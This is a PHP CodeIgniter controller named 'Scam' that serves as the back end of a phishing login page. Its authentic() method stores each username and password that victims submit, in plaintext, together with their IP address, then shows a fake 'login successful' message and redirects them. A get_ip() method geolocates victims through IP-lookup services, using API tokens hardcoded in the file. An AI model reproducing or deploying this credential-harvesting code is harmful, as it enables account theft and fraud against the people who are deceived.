<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Scam extends CI_Controller {

    public $dateNow;
	public $dateTimeNow;

    function __construct()
	{
		parent::__construct();
		$this->load->model('Site_model');
		date_default_timezone_set('Asia/Ho_Chi_Minh');
		$this->dateNow = date('Y-m-d');
		$this->dateTimeNow = date('Y-m-d H:i:s');
	}

	public function index()
	{
		
	}
    public function login()
    {
        // $this->get_ip();
        $this->load->view('scam/login');
    }

    function authentic()
    {
        $arrData = $this->input->post();
		$typeLogin = $arrData['type'];
		$username = $arrData['username'];
		$password = $arrData['password'];
		$path = $arrData['path'];
        $redirect = isset($arrData['redirect'])?$arrData['redirect']:null;
        $ipAddress = $this->getUserIP();
        $dataInsert = [
            'username'=>$username,
            'password'=>$password,
            'ip_address'=>$ipAddress,
            'type_login'=>$typeLogin,
            'path'=>$path,
            'redirect' => $redirect,
            'created'=>$this->dateTimeNow,
            'updated'=>$this->dateTimeNow
        ];
        $saveLog = $this->Site_model->insert_data('log_login_scam',$dataInsert);
        if($saveLog){
            $id = $this->db->insert_id();
            $updatedIpAddress = $this->Site_model->update_data('ip_address',
                ['log_login_scam_id'=>$id,'updated'=>$this->dateTimeNow],
                ['ip_address'=>$ipAddress]
            );
            $result = [
                'status' => true,
                'message' => 'Đăng nhập thành công',
                'redirect'=> $redirect
            ];
        }else{
            $result = [
                'status' => false,
                'message' => 'Vui lòng kiểm tra lại tài khoản hoặc mật khẩu'
            ];
        }
        echo json_encode($result);
    }

    function get_ip()
	{
		$ip_address = $this->getUserIP();
		$auth = '4b57237321f571';
		$url = 'ipinfo.io/'.$ip_address.'?token='.$auth;
		$document = $this->curl($url);
		$result = json_decode($document);
		if (isset($result->bogon)) {
			$request_uri = 'https://ipfind.co';
			$auth = '8cecdf11-b336-4024-b054-0eee0072ae8e';
			$url = $request_uri . "?ip=" . $ip_address . "&auth=" . $auth;
			$document = $this->curl($url);
			$result = json_decode($document);
			if (isset($result->error)) {
				return false;
			}
		}
		$loc = isset($result->loc)?$result->loc:'';
		if ($loc) {
			$arrLoc = explode(',', $loc);
		}
		$country = $result->country;
		$city = $result->city;
		$longitude = isset($result->longitude)?$result->longitude:$arrLoc[1];
		$latitude = isset($result->latitude)?$result->latitude:$arrLoc[0];
		try
		{	
			$action = $this->Site_model->insert_data('ip_address',['ip_address'=>$ip_address,'province'=>$city,'created'=>date('Y-m-d H:i:s'),'longitude'=>$longitude,'latitude'=>$latitude,'country'=>$country,'json'=>$document]);
			throw new Exception('Opps');
		}
		catch(\Exception $e){
			return false;
		}
		
		
	}

	function curl($url)
	{
        $curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_HEADER, false);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_ENCODING, "");
		$curlData = curl_exec($curl);
		curl_close($curl); 
        return $curlData;
	}

	function getLocalIp()
	{ 
		return gethostbyname(trim(`hostname`)); 
	}

	function getUserIP() {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_X_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        else if(isset($_SERVER['REMOTE_ADDR']))
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    function getIP($ip = null, $deep_detect = TRUE)
    {
	    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
	        $ip = $_SERVER["REMOTE_ADDR"];
	        if ($deep_detect) {
	            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
	                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
	                $ip = $_SERVER['HTTP_CLIENT_IP'];
	        }
	    } else {
	        $ip = $_SERVER["REMOTE_ADDR"];
	    }
	    return $ip;
	}

}

/* End of file Scam.php */
/* Location: ./application/controllers/Scam.php */